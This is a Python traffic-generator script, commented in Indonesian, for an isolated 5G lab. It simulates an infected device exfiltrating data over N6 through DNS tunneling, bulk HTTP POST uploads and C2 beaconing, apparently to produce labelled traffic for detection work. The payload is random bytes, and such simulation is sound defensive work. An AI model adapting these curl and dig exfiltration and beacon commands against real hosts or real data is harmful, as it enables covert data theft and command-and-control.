#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Grup 1 — n6_exfiltration (N6, dari ue-mal lewat uesimtun0 → DN).
Guideline: Core-5, Core-33, Core-34 (kerahasiaan / exfiltrasi data). Model ancaman:
UE terinfeksi meng-exfil data ke luar lewat N6. Tiga pola (dipilih bergiliran):
  dns_tunnel : query DNS dgn subdomain panjang ter-enkode (data) → server @DN.
  bulk_upload: HTTP POST body besar (unggahan data curian) → webserver DN.
  beacon     : GET kecil berkala (C2 beaconing) interval tetap → webserver DN.

Semua lewat uesimtun0 (src 10.45.0.9) → GTP-U N3 → N6. Tiap curl/dig = koneksi
baru = source port efemeral baru = 1 flow kanonik independen.

  python3 n6_exfil.py <dn_ip>
Env (mode EPISODE):
  SESSIONS=<n>   jumlah flow independen (default 40)
  IFACE=<dev>    interface UE (default uesimtun0)
  MODE=<pola>    paksa satu pola (dns_tunnel|bulk_upload|beacon); default bergiliran
Hanya LAB TERISOLASI. Guard subnet ditegakkan run_scenario.sh.
"""
import sys, os, time, random, string, subprocess

def rand_label(n):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))

def run_cmd(args, timeout=6):
    try:
        subprocess.run(args, capture_output=True, timeout=timeout)
    except Exception:
        pass

def dns_tunnel(dn, iface):
    # Subdomain panjang ter-"enkode" (data exfil) ke resolver @DN. Walau NXDOMAIN/timeout,
    # query N6 (UDP/53) adalah sinyalnya.
    labels = ".".join(rand_label(random.choice([20, 30, 40, 50])) for _ in range(random.choice([2, 3, 4])))
    qname = f"{labels}.exfil.lab"
    run_cmd(["dig", "+time=2", "+tries=1", f"@{dn}", qname, "TXT"])

def bulk_upload(dn, iface):
    size = random.choice([64, 128, 256, 512]) * 1024   # 64KB..512KB "data curian"
    # --data-binary dari /dev/urandom via proses shell agar body besar tanpa file.
    subprocess.run(
        ["sh", "-c",
         f"head -c {size} /dev/urandom | curl -s -o /dev/null --interface {iface} "
         f"-m 8 -X POST --data-binary @- 'http://{dn}/upload?id={rand_label(8)}'"],
        capture_output=True)

def beacon(dn, iface):
    run_cmd(["curl", "-s", "-o", "/dev/null", "--interface", iface, "-m", "5",
             "-A", "beacon/1.0", f"http://{dn}/c2?b={rand_label(6)}"])

POLA = {"dns_tunnel": dns_tunnel, "bulk_upload": bulk_upload, "beacon": beacon}

def main():
    if len(sys.argv) < 2:
        print(__doc__); sys.exit(2)
    dn = sys.argv[1]
    iface = os.environ.get("IFACE", "uesimtun0")
    sessions = int(os.environ.get("SESSIONS", "40"))
    force = os.environ.get("MODE", "").strip()
    order = ["dns_tunnel", "bulk_upload", "beacon"]
    print(f"[n6_exfiltration] {sessions} flow → {dn} via {iface} "
          f"(pola: {force or 'bergiliran dns/bulk/beacon'})")
    counts = {}
    for i in range(sessions):
        mode = force if force in POLA else order[i % len(order)]
        POLA[mode](dn, iface)
        counts[mode] = counts.get(mode, 0) + 1
        time.sleep(random.uniform(0.03, 0.12))   # jitter / beacon interval
    print(f"[n6_exfiltration] selesai {sessions} koneksi N6. Ringkas pola → {counts}")

if __name__ == "__main__":
    main()
